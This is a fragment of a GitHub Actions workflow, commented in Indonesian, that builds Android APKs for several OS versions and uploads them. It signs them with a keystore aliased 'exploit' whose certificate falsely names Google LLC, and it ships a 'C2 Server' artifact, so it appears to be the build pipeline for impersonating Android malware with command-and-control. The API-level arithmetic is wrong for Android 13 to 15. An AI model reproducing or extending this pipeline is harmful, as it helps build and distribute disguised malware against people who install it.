    - name: ðŸ—ï¸ BUILD APK
      run: |
        echo "ðŸ”¨ Memulai build process..."
        
        # Set target Android versions (selalu all)
        TARGETS="10 11 12 13 14 15"
        
        # Build untuk setiap versi
        for VER in $TARGETS; do
          echo "ðŸ“± Building untuk Android $VER..."
          
          # Hitung API level
          API=$((VER + 19))
          
          # Update targetSdk di build.gradle
          sed -i "s/targetSdk [0-9]\+/targetSdk $API/g" app/build.gradle
          
          # Build APK
          ./gradlew clean assembleRelease --no-daemon || true
          
          # Copy APK dengan nama sesuai versi
          if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
            mv app/build/outputs/apk/release/app-release.apk \
               "${{ github.event.inputs.app_name }}_Android${VER}.apk"
            echo "âœ… APK Android $VER berhasil: $(ls -lh ${{ github.event.inputs.app_name }}_Android${VER}.apk)"
          elif [ -f "app/build/outputs/apk/release/app-release-unsigned.apk" ]; then
            mv app/build/outputs/apk/release/app-release-unsigned.apk \
               "${{ github.event.inputs.app_name }}_Android${VER}_unsigned.apk"
            echo "âš ï¸ APK Android $VER (unsigned): $(ls -lh ${{ github.event.inputs.app_name }}_Android${VER}_unsigned.apk)"
          else
            echo "âŒ Gagal build untuk Android $VER"
          fi
        done
        
    - name: ðŸ” SIGN APK
      if: success()
      run: |
        # Generate keystore sementara
        keytool -genkey -v -keystore release.keystore \
          -alias exploit -keyalg RSA -keysize 2048 -validity 10000 \
          -storepass "Exploit@2024" -keypass "Exploit@2024" \
          -dname "CN=Google LLC, OU=Android, O=Google, L=MV, ST=CA, C=US"
        
        # Sign semua APK
        for apk in ${{ github.event.inputs.app_name }}_Android*.apk; do
          if [[ "$apk" != *"signed"* ]] && [[ "$apk" != *"unsigned"* ]]; then
            echo "ðŸ” Signing $apk..."
            mv "$apk" "temp_$apk"
            apksigner sign --ks release.keystore --ks-pass pass:Exploit@2024 \
              --key-pass pass:Exploit@2024 --out "$apk" "temp_$apk"
            rm "temp_$apk"
            echo "âœ… Signed: $apk"
          fi
        done
        
    - name: ðŸ“¤ UPLOAD ARTIFACTS
      uses: actions/upload-artifact@v4
      with:
        name: ${{ github.event.inputs.app_name }}-APKs-${{ github.run_number }}
        path: |
          *.apk
          !temp_*.apk
        retention-days: 30
        
    - name: ðŸ“¤ UPLOAD C2 SERVER
      uses: actions/upload-artifact@v4
      with:
        name: C2-Server-Files
        path: |
          server/
          public/
